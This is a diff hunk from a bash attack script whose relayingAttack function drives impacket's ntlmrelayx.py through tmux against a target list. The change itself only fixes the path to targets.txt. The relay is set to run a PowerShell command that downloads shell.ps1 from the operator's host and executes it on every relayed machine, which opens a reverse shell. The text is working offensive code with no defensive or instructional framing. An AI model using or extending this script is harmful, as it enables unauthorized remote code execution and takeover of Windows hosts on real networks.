@@ -213,7 +213,7 @@ function relayingAttack(){
   if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
   command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
   cp $targets $(pwd)/impacket/targets.txt
-  let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
+  let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
 
 
   if [ ! -z $quiet ];then echo -e "${blueColour}[*]${endColour} $lport port open to receive the connection\n"; sleep 0.5; fi
